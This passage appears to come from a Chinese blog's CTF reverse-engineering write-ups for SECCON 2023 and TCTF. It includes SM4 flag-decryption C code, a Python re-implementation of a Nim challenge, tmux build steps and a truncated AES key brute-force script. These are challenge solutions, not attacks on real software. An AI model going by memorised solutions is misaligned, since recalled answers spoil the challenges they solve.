class="number">0xBB</span>, <span class="number">0x16</span>&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> FK[<span class="number">4</span>] = &#123;<span class="number">0xFF324600</span>, <span class="number">0x4F9A25B8</span>, <span class="number">0x3CC7477C</span>,</span><br><span class="line">  <span class="number">0x0C0B9ECD</span>&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> CK[<span class="number">32</span>] = &#123;</span><br><span class="line">  <span class="number">0xEC656287</span>, <span class="number">0xD9A22031</span>, <span class="number">0x01C7BCA8</span>, <span class="number">0xABE7033B</span>, <span class="number">0x313FE5DC</span>, <span class="number">0x940FFAD0</span>,</span><br><span class="line">  <span class="number">0x176EDEB8</span>, <span class="number">0x7C61B20E</span>, <span class="number">0x9EAD452F</span>, <span class="number">0x80E2C15B</span>, <span class="number">0xBA500D7B</span>, <span class="number">0xA2C0449F</span>,</span><br><span class="line">  <span class="number">0xBC0E774F</span>, <span class="number">0x3E393763</span>, <span class="number">0x43D46B3F</span>, <span class="number">0x2ADEF404</span>, <span class="number">0xCA884B87</span>, <span class="number">0x3C953C45</span>,</span><br><span class="line">  <span class="number">0x7CDBDE63</span>, <span class="number">0x6E995945</span>, <span class="number">0xB6CF3655</span>, <span class="number">0x8D60396A</span>, <span class="number">0x9A496B38</span>, <span class="number">0x9D87D81B</span>,</span><br><span class="line">  <span class="number">0x36FEDBC9</span>, <span class="number">0x79882953</span>, <span class="number">0x10611E15</span>, <span class="number">0x0030AB3E</span>, <span class="number">0x12503487</span>, <span class="number">0x187E21FF</span>,</span><br><span class="line">  <span class="number">0x6D85127E</span>, <span class="number">0xDF42C76C</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="title">sm4Sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> inch)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *pTable = (<span class="type">unsigned</span> <span class="type">char</span> *)SboxTable;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> retVal = (<span class="type">unsigned</span> <span class="type">char</span>)(pTable[inch]);</span><br><span class="line">  <span class="keyword">return</span> retVal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title">sm4Lt</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> ka)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> bb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> c = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">4</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> b[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ka, a, <span class="number">0</span>)</span><br><span class="line">  b[<span class="number">0</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">0</span>]);</span><br><span class="line">  b[<span class="number">1</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">1</span>]);</span><br><span class="line">  b[<span class="number">2</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">2</span>]);</span><br><span class="line">  b[<span class="number">3</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">3</span>]);</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(bb, b, <span class="number">0</span>)</span><br><span class="line">  c = bb ^ (<span class="built_in">ROTL</span>(bb, <span class="number">3</span>)) ^ (<span class="built_in">ROTL</span>(bb, <span class="number">14</span>)) ^ (<span class="built_in">ROTL</span>(bb, <span class="number">15</span>)) ^ (<span class="built_in">ROTL</span>(bb, <span class="number">9</span>));</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title">sm4F</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> x0, <span class="type">unsigned</span> <span class="type">long</span> x1, <span class="type">unsigned</span> <span class="type">long</span> x2,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">unsigned</span> <span class="type">long</span> x3, <span class="type">unsigned</span> <span class="type">long</span> rk)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x0 ^ <span class="built_in">sm4Lt</span>(x1 ^ x2 ^ x3 ^ rk));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title">sm4CalciRK</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> ka)</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> bb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rk = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">4</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> b[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ka, a, <span class="number">0</span>)</span><br><span class="line">  b[<span class="number">0</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">0</span>]);</span><br><span class="line">  b[<span class="number">1</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">1</span>]);</span><br><span class="line">  b[<span class="number">2</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">2</span>]);</span><br><span class="line">  b[<span class="number">3</span>] = <span class="built_in">sm4Sbox</span>(a[<span class="number">3</span>]);</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(bb, b, <span class="number">0</span>)</span><br><span class="line">  rk = bb ^ (<span class="built_in">ROTL</span>(bb, <span class="number">11</span>)) ^ (<span class="built_in">ROTL</span>(bb, <span class="number">25</span>));</span><br><span class="line">  <span class="keyword">return</span> rk;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sm4_setkey</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> SK[<span class="number">32</span>], <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> MK[<span class="number">4</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> k[<span class="number">36</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(MK[<span class="number">0</span>], key, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(MK[<span class="number">1</span>], key, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(MK[<span class="number">2</span>], key, <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(MK[<span class="number">3</span>], key, <span class="number">12</span>);</span><br><span class="line">  k[<span class="number">0</span>] = MK[<span class="number">0</span>] ^ FK[<span class="number">0</span>];</span><br><span class="line">  k[<span class="number">1</span>] = MK[<span class="number">1</span>] ^ FK[<span class="number">1</span>];</span><br><span class="line">  k[<span class="number">2</span>] = MK[<span class="number">2</span>] ^ FK[<span class="number">2</span>];</span><br><span class="line">  k[<span class="number">3</span>] = MK[<span class="number">3</span>] ^ FK[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">for</span> (; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    k[i + <span class="number">4</span>] = k[i] ^ (<span class="built_in">sm4CalciRK</span>(k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>] ^ CK[i]));</span><br><span class="line">    SK[i] = k[i + <span class="number">4</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sm4_one_round</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> sk[<span class="number">32</span>], <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">16</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">unsigned</span> <span class="type">char</span> output[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ulbuf[<span class="number">36</span>];</span><br><span class="line">  <span class="built_in">memset</span>(ulbuf, <span class="number">0</span>, <span class="built_in">sizeof</span>(ulbuf));</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(ulbuf[<span class="number">0</span>], input, <span class="number">0</span>)</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(ulbuf[<span class="number">1</span>], input, <span class="number">4</span>)</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(ulbuf[<span class="number">2</span>], input, <span class="number">8</span>)</span><br><span class="line">  <span class="built_in">GET_ULONG_BE</span>(ulbuf[<span class="number">3</span>], input, <span class="number">12</span>)</span><br><span class="line">  <span class="keyword">while</span> (i &lt; <span class="number">32</span>) &#123;</span><br><span class="line">    ulbuf[i + <span class="number">4</span>] =</span><br><span class="line">    <span class="built_in">sm4F</span>(ulbuf[i], ulbuf[i + <span class="number">1</span>], ulbuf[i + <span class="number">2</span>], ulbuf[i + <span class="number">3</span>], sk[i]);</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">35</span>], output, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">34</span>], output, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">33</span>], output, <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">PUT_ULONG_BE</span>(ulbuf[<span class="number">32</span>], output, <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_setkey_enc</span><span class="params">(sm4_context *ctx, <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">  ctx-&gt;mode = SM4_ENCRYPT;</span><br><span class="line">  <span class="built_in">sm4_setkey</span>(ctx-&gt;sk, key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_setkey_dec</span><span class="params">(sm4_context *ctx, <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  ctx-&gt;mode = SM4_DECRYPT;</span><br><span class="line">  <span class="built_in">sm4_setkey</span>(ctx-&gt;sk, key);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">SWAP</span>(ctx-&gt;sk[i], ctx-&gt;sk[<span class="number">31</span> - i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_crypt_ecb</span><span class="params">(sm4_context *ctx, <span class="type">int</span> mode, <span class="type">int</span> length, <span class="type">unsigned</span> <span class="type">char</span> *input,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">unsigned</span> <span class="type">char</span> *output)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sm4_one_round</span>(ctx-&gt;sk, input, output);</span><br><span class="line">    input += <span class="number">16</span>;</span><br><span class="line">    output += <span class="number">16</span>;</span><br><span class="line">    length -= <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sm4_crypt_cbc</span><span class="params">(sm4_context *ctx, <span class="type">int</span> mode, <span class="type">int</span> length, <span class="type">unsigned</span> <span class="type">char</span> iv[<span class="number">16</span>],</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">char</span> *output)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">16</span>];</span><br><span class="line">  <span class="keyword">if</span> (mode == SM4_ENCRYPT) &#123;</span><br><span class="line">    <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        output[i] = (<span class="type">unsigned</span> <span class="type">char</span>)(input[i] ^ iv[i]);</span><br><span class="line">      <span class="built_in">sm4_one_round</span>(ctx-&gt;sk, output, output);</span><br><span class="line">      <span class="built_in">memcpy</span>(iv, output, <span class="number">16</span>);</span><br><span class="line">      input += <span class="number">16</span>;</span><br><span class="line">      output += <span class="number">16</span>;</span><br><span class="line">      length -= <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="comment">/* SM4_DECRYPT */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(temp, input, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sm4_one_round</span>(ctx-&gt;sk, input, output);</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        output[i] = (<span class="type">unsigned</span> <span class="type">char</span>)(output[i] ^ iv[i]);</span><br><span class="line">      <span class="built_in">memcpy</span>(iv, temp, <span class="number">16</span>);</span><br><span class="line">      input += <span class="number">16</span>;</span><br><span class="line">      output += <span class="number">16</span>;</span><br><span class="line">      length -= <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">17</span>] = <span class="string">&quot;SECCON CTF 2023!&quot;</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">112</span>] = &#123;</span><br><span class="line">    <span class="number">0xFE</span>, <span class="number">0x60</span>, <span class="number">0xA8</span>, <span class="number">0xC0</span>, <span class="number">0x3B</span>, <span class="number">0xFE</span>, <span class="number">0xBC</span>, <span class="number">0x66</span>, <span class="number">0xFC</span>, <span class="number">0x9A</span>, <span class="number">0x9B</span>, <span class="number">0x31</span>,</span><br><span class="line">    <span class="number">0x9A</span>, <span class="number">0xD8</span>, <span class="number">0x03</span>, <span class="number">0xBB</span>, <span class="number">0xA9</span>, <span class="number">0xE1</span>, <span class="number">0x56</span>, <span class="number">0xFC</span>, <span class="number">0xFC</span>, <span class="number">0x11</span>, <span class="number">0x9F</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x4D</span>, <span class="number">0x9F</span>, <span class="number">0xE0</span>, <span class="number">0x9F</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xCF</span>, <span class="number">0x5E</span>, <span class="number">0x73</span>, <span class="number">0xCB</span>, <span class="number">0xEC</span>,</span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0xFF</span>, <span class="number">0xB9</span>, <span class="number">0xD1</span>, <span class="number">0x99</span>, <span class="number">0x44</span>, <span class="number">0x1B</span>, <span class="number">0x9A</span>, <span class="number">0x79</span>, <span class="number">0x79</span>, <span class="number">0xEC</span>, <span class="number">0xD1</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xFD</span>, <span class="number">0xEA</span>, <span class="number">0x2B</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x70</span>, <span class="number">0x76</span>, <span class="number">0x3C</span>, <span class="number">0x2E</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0x3B</span>, <span class="number">0x7B</span>, <span class="number">0x66</span>, <span class="number">0xA3</span>, <span class="number">0x4B</span>, <span class="number">0x1B</span>, <span class="number">0x5C</span>, <span class="number">0x0F</span>, <span class="number">0xBE</span>, <span class="number">0xDD</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0xD0</span>, <span class="number">0x0A</span>, <span class="number">0x3D</span>, <span class="number">0x7E</span>, <span class="number">0x2C</span>, <span class="number">0x10</span>, <span class="number">0x56</span>, <span class="number">0x2A</span>, <span class="number">0x10</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0xD9</span>, <span class="number">0xB9</span>, <span class="number">0x7F</span>, <span class="number">0x3E</span>, <span class="number">0x2E</span>, <span class="number">0x86</span>, <span class="number">0xB7</span>, <span class="number">0x17</span>, <span class="number">0x04</span>, <span class="number">0xDF</span>, <span class="number">0xB1</span>,</span><br><span class="line">    <span class="number">0x27</span>, <span class="number">0xC4</span>, <span class="number">0x47</span>, <span class="number">0xE2</span>, <span class="number">0xD9</span>, <span class="number">0x7A</span>, <span class="number">0x9A</span>, <span class="number">0x48</span>, <span class="number">0x7C</span>, <span class="number">0xDB</span>, <span class="number">0xC6</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0xA3</span>, <span class="number">0x21</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> output[<span class="number">112</span>];</span><br><span class="line">  sm4_context ctx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> i;</span><br><span class="line">  <span class="comment">// sm4_setkey_enc(&amp;ctx, key);</span></span><br><span class="line">  <span class="comment">// sm4_crypt_ecb(&amp;ctx, 1, 64, input, output);</span></span><br><span class="line">  <span class="comment">// for (i = 0; i &lt; 64; i++)</span></span><br><span class="line">  <span class="comment">// printf(&quot;%02x &quot;, output[i]);</span></span><br><span class="line">  <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">  <span class="built_in">sm4_setkey_dec</span>(&amp;ctx, key);</span><br><span class="line">  <span class="built_in">sm4_crypt_ecb</span>(&amp;ctx, <span class="number">0</span>, <span class="number">112</span>, input, output);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">112</span>; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, output[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="optinimize"><a class="markdownIt-Anchor" href="#optinimize">#</a> optinimize</h4>
<p>第一次见的 nim 编译产物，抽象是有点抽象的，尤其这个符号表（有点当年第一次见 rust 的美感）</p>
<p>主动态来看，发现它输出 flag 的几位后就卡住了，本来想着是不是要考模拟执行，然后发现应该就是手动把整个流程复现出来，让他跑就完了</p>
<p>调一下发现主要就是在 <code>Q_main</code>  里面的 <code>P_main</code>  卡住的</p>
<p>然后不会了，只得看 wp…555555555555…</p>
<p>这是模拟的代码，一样是跑不出来的（注意 dump 的时候都是 QWORD 格式，可以自己处理一下）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">i: <span class="built_in">int</span></span>):</span><br><span class="line">    num1 = <span class="number">3</span></span><br><span class="line">    num2 = <span class="number">0</span></span><br><span class="line">    num3 = <span class="number">2</span></span><br><span class="line">    num4 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i == num4:</span><br><span class="line">        <span class="keyword">return</span> num1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num5 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == num5:</span><br><span class="line">            <span class="keyword">return</span> num2</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num6 = <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> i == num6:</span><br><span class="line">                <span class="keyword">return</span> num3</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num7 = <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> num7 &lt; i:</span><br><span class="line">                    j = i</span><br><span class="line">                    num8 = <span class="number">2</span></span><br><span class="line">                    <span class="keyword">while</span> num8 &lt; j:</span><br><span class="line">                        v98 = num1 + num2</span><br><span class="line">                        num1 = num2</span><br><span class="line">                        num2 = num3</span><br><span class="line">                        num3 = v98</span><br><span class="line">                        j -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">return</span> num3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q</span>(<span class="params">n: <span class="built_in">int</span></span>):</span><br><span class="line">    i = num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        v63 = P(num) % num</span><br><span class="line">        <span class="keyword">if</span> v63 == <span class="number">0</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">ns = [<span class="number">0x000000000000004A</span>, <span class="number">0x0000000000000055</span>, <span class="number">0x000000000000006F</span>, <span class="number">0x0000000000000079</span>, <span class="number">0x0000000000000080</span>, <span class="number">0x0000000000000095</span>, <span class="number">0x00000000000000AE</span>, <span class="number">0x00000000000000BF</span>, <span class="number">0x00000000000000C7</span>, <span class="number">0x00000000000000D5</span>, <span class="number">0x0000000000000306</span>, <span class="number">0x0000000000001AC8</span>, <span class="number">0x00000000000024BA</span>, <span class="number">0x0000000000003D00</span>, <span class="number">0x0000000000004301</span>, <span class="number">0x0000000000005626</span>, <span class="number">0x0000000000006AD9</span>, <span class="number">0x0000000000007103</span>, <span class="number">0x000000000000901B</span>, <span class="number">0x0000000000009E03</span>, <span class="number">0x00000000001E5FB6</span>, <span class="number">0x000000000026F764</span>, <span class="number">0x000000000030BD9E</span>, <span class="number">0x0000000000407678</span>, <span class="number">0x00000000005B173B</span>, <span class="number">0x00000000006FE3B1</span>, <span class="number">0x000000000078EF25</span>, <span class="number">0x0000000000858E5F</span>, <span class="number">0x000000000098C639</span>, <span class="number">0x0000000000AD6AF6</span>, <span class="number">0x0000000001080096</span>, <span class="number">0x00000000018E08CD</span>, <span class="number">0x0000000001BB6107</span>, <span class="number">0x0000000001F50FF1</span>, <span class="number">0x00000000025C6327</span>, <span class="number">0x0000000002A971B6</span>, <span class="number">0x0000000002D68493</span>, <span class="number">0x000000000362F0C0</span>, <span class="number">0x0000000003788EAD</span>, <span class="number">0x0000000003CAA8ED</span>]</span><br><span class="line"></span><br><span class="line">cs = [<span class="number">0x3C</span>,<span class="number">0xF4</span>,<span class="number">0x1A</span>,<span class="number">0xD0</span>,<span class="number">0x8A</span>,<span class="number">0x17</span>,<span class="number">0x7C</span>,<span class="number">0x4C</span>,<span class="number">0xDF</span>,<span class="number">0x21</span>,<span class="number">0xDF</span>,<span class="number">0xB0</span>,<span class="number">0x12</span>,<span class="number">0xB8</span>,<span class="number">0x4E</span>,<span class="number">0xFA</span>,<span class="number">0xD9</span>,<span class="number">0x2D</span>,<span class="number">0x66</span>,<span class="number">0xFA</span>,<span class="number">0xD4</span>,<span class="number">0x95</span>,<span class="number">0xF0</span>,<span class="number">0x66</span>,<span class="number">0x6D</span>,<span class="number">0xCE</span>,<span class="number">0x69</span>,<span class="number">0x00</span>,<span class="number">0x7D</span>,<span class="number">0x95</span>,<span class="number">0xEA</span>,<span class="number">0xD9</span>,<span class="number">0x0A</span>,<span class="number">0xEB</span>,<span class="number">0x27</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x11</span>,<span class="number">0x37</span>,<span class="number">0xD4</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cs)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((Q(ns[i]) &amp; <span class="number">0xff</span>) ^ cs[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>唉然后是优化，oi 题来了… 没太看懂，贴个 wp 吧…（r3 大哥确实太高手了）</p>
<p><img loading="lazy" data-src="seccon-2023/image-20230919171428466.png" alt="image-20230919171428466"></p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>tctf</title>
    <url>/2023/12/08/tctf/</url>
    <content><![CDATA[<h6 id="preface状态差本来不想打了但是又不想浪费时间刚电子ed结束五个小时又开始了打个rpg好累"><a class="markdownIt-Anchor" href="#preface状态差本来不想打了但是又不想浪费时间刚电子ed结束五个小时又开始了打个rpg好累">#</a> PREFACE：状态差，本来不想打了，但是又不想浪费时间，刚电子 ed 结束五个小时又开始了打个 rpg 好累</h6>
<h6 id="确实状态差最近老是抱着不出题的心态开始做有点啥思路反正又丢给别人自己不知道在干嘛有始有终给wp水了吧"><a class="markdownIt-Anchor" href="#确实状态差最近老是抱着不出题的心态开始做有点啥思路反正又丢给别人自己不知道在干嘛有始有终给wp水了吧">#</a> 确实状态差，最近老是抱着不出题的心态开始做，有点啥思路反正又丢给别人自己不知道在干嘛，有始有终给 wp 水了吧，，，</h6>
<span id="more"></span>
<h3 id="tmux"><a class="markdownIt-Anchor" href="#tmux">#</a> tmux</h3>
<p>符号表打进去，其实用处不大</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/tmux/tmux.git</span><br><span class="line">cd tmux</span><br><span class="line">git checkout bdf8e614af34ba1eaa8243d3a818c8546cb21812</span><br><span class="line"></span><br><span class="line">sudo apt-get install libevent-dev libncurses-dev</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure CFLAGS=&quot;-g -O0&quot;</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>找这段（十六进制搜）：</p>
<p><img loading="lazy" data-src="tctf/image-20231208195004762.png" alt="image-20231208195004762"></p>
<p>调调看看发现是 aes，key 只有 012</p>
<p>（偷 sink 爷个脚本）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                            <span class="keyword">for</span> i8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                <span class="keyword">for</span> i9 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                    <span class="keyword">for</span> ia <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                        <span class="keyword">for</span> ib <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                            <span class="keyword">for</span> ic <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                                <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                                    <span class="keyword">for</span> ie <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                                        <span class="keyword">for</span> iff <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                                            <span class="keyword">for</span> i10 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">                                                                key = [</span><br><span class="line">                                                                    i1,</span><br><span class="line">                                                                    i2,</span><br><span class="line">                                                                    i3,</span><br><span class="line">                                                                    i4,</span><br><span class="line">                                                                    i5,</span><br><span class="line">                                                                    i6,</span><br><span class="line">                                                                    i7,</span><br><span class="line">                                                                    